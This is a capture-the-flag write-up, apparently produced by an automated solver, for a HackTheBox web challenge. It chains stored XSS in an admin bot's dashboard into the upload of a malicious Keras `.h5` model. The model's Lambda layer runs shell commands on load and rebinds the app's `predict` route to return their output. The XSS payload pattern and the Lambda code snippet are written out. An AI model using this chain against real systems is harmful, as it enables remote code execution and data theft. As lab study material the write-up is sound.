# Why Lambda — HackTheBox (web)

Flag: recorded in `challenges/why_lambda/state.json` via `tools/hooks.py pre-flag`
(live response, `POST /api/predict`).
Assistance: self-solved. Solved from the handout; no writeup search was used.

## Layout

nginx on 1337: `/` → the Vue dev server on 8080, `/api/` → Flask on 5000.
`conf/supervisord.conf` sets `directory=/app/backend` for the API, so `models/`,
`complaints/` and `sessions/` are all relative to `/app/backend`. The flag is
`/app/flag.txt`. Base image `tensorflow/tensorflow:2.12.0` (Python 3.8).

## Sink — `backend/app.py:90`

```py
if file and ".h5" in file.filename:
    file.save(os.path.join(MODELS, name))
    test_model(MODELS+name)          # model.py:58 -> keras.models.load_model(path)
```

Any filename merely *containing* `.h5` is accepted, and `load_model` on an HDF5
Keras model deserialises a `Lambda` layer by unmarshalling a code object
(`func_load`). Building the `Sequential` calls each layer on a symbolic tensor,
so the code runs **during deserialisation** — `evaluate()` is never needed, and
it does not matter that the model is uncompiled and evaluation then fails.

Verified offline before touching the target, in the target's own base image:

```
before: 7
load_model returned a model
after: '---\n/:\n.\n..\n.dockerenv\nbin\n...'
RESULT: LAMBDA EXECUTED
```

The `.h5` has to be produced inside that image: the Lambda payload is a
marshalled code object, and marshal's format is tied to the interpreter version,
so a file built on a different Python will not load.

## Gate and the way in

`auth.py` requires `username` in the session, and only `/api/login` sets it,
against `ALIENT_USERNAME`/`ALIENT_PASSWORD` from `.env`. `entrypoint.sh` fixes
the username to `zaphod_beeblebrox` but generates a 32-character random
password, so the session has to come from the bot.

`app.py:85` — every `POST /api/complaint` spawns
`complaints.check_complaints`, a headless Chrome that logs into
`http://127.0.0.1:1337/dashboard` with the real credentials and then idles for
ten seconds. `Dashboard.vue:65`:

```js
getPredictionText(complaint) {
    return `<p>Our amazing model said the image represented the digit: <b>${complaint.prediction}</b></p>`;
}
```

and `ImageBanner.vue:8` renders that string with `v-html`. `prediction` is taken
straight from the complaint JSON and only checked for `prediction == None`, so
any string reaches the sink. `v-html` does not run `<script>`, so the payload is
an `onerror` handler.

`csrf.py` compares a static header, `X-SPACE-NO-CSRF: 1`. It stops a plain form
post but not a same-origin `fetch`, which is exactly what runs in the bot.

So the complaint carries an `<img src=x onerror="eval(atob(...))">` whose script
rebuilds the `.h5` from base64 into a `Blob`, wraps it in `FormData` and posts it
to `/api/internal/model` with `credentials: "include"`.

## Read-back

No unauthenticated endpoint returns stored data: `/api/internal/complaints` and
`/api/internal/models/<path>` are both behind `@authenticated`, and
`/api/metrics` and `/api/data` return fixed numbers. Rather than stand up an
external listener, the Lambda rebinds the one function whose result an
unauthenticated route does return:

```py
lambda x: __import__("sys").modules["__main__"].__setattr__(
    "predict",
    lambda d: __import__("subprocess").run(CMD, shell=True, capture_output=True)
              .stdout.decode()[:3000]) or x
```

`app.py` does `from model import ... predict`, so the name it calls is a global
of `__main__`; rebinding it there is enough. `POST /api/predict` needs only the
static CSRF header, and it returned the flag. `model.py:52` documents `predict`
as returning a random digit — "What's the point anyway?" — so nothing depends on
it, which is what makes it the right thing to rebind.

`predict` returning a string instead of an int was also the only oracle for the
whole chain: nothing else in the application changes observably when the XSS,
the upload or the deserialisation succeeds.

## Traps

* The payload must be built inside the target's image. A Lambda layer stores a
  marshalled code object and the format is interpreter-specific.
* Keras runs the Lambda while the graph is being built, not when the model is
  evaluated, so an uncompiled model that cannot be evaluated is still enough.
  The upload route answers 422 on a successful exploit.
* `v-html` does not execute `<script>`; use an event handler.
* The filename check is a substring test, so `evil.h5` and `x.h5.txt` both pass.

## Cleanup

A second model was uploaded through the same chain to rebind `predict` back to
`model.predict`, delete the two complaint files this session created (matched on
their exact `description` values so genuine complaints are untouched) and delete
every uploaded model except `main.h5`, including itself.

**This cleanup was not verified.** The instance became unreachable on every path,
including `/`, which nginx proxies to the frontend, before the check ran, so the
container was gone rather than the Flask app being broken. The cleanup payload
only rebinds one Python name and removes files under `/app/backend/models` and
`/app/backend/complaints`, none of which nginx or the frontend depend on, but
that is reasoning, not evidence. What is left behind if the payload never ran:
`__main__.predict` still returning command output, two complaint files, and one
or two uploaded `.h5` models — all inside an ephemeral container.
